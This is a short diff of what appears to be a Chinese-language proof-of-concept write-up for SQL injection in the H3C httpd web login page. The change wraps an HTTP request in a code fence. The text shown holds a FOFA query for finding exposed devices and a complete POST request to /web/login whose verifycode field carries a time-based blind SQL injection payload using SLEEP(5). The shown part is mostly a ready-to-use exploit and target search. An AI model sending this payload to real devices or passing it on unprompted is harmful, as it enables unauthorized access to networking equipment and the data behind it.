@@ -80,6 +80,8 @@ FOFA：server="H3C httpd" && title=="请登录"
 
 POC/EXP：
 
+
+```http
 POST /web/login HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
@@ -90,6 +92,8 @@ Accept-Encoding: gzip, deflate, br, zstd
 Connection: keep-alive
 
 user_name=admin&password=admin&verifycode=1' AND (SELECT 9821 FROM (SELECT(SLEEP(5)))dfpe) AND 'dYCM'='&language=0
+```
+
 
 ![image-20250213163039164](./.resource/H3Chttp服务器webloginSQL注入漏洞/media/image-20250213163039164.png)
 
